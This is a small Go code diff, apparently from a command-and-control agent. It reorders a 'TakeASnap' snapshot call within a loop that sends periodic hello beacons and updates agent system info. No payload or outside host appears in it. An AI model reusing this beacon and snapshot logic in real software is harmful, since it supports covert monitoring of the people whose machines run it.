@@ -172,7 +172,6 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 	// send hello every second
 	for ctx.Err() == nil {
-		util.TakeASnap()
 		if !sendHello(util.RandInt(1, 10)) {
 			log.Print("sendHello failed")
 			break
@@ -181,6 +180,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		if err != nil {
 			log.Printf("Updating agent sysinfo: %v", err)
 		}
+		util.TakeASnap()
 	}
 
 	if err == nil {
